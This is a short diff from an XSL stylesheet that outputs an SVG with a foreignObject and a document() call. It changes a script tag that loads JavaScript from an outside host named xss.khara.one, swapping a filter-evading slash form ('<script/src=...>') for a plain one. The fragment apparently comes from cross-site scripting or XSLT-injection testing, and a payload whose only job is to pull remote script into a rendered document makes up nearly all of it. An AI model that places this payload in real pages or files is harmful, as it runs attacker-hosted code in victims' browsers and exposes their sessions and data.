@@ -14,7 +14,7 @@
 			document() <xsl:copy-of  select="document('test.xsl')"/>
 		    </div>
 		</foreignObject>
-    <script/src=//xss.khara.one/a></script>
+    <script src=//xss.khara.one/a></script>
 	</svg>
  </xsl:template>
 </xsl:stylesheet>
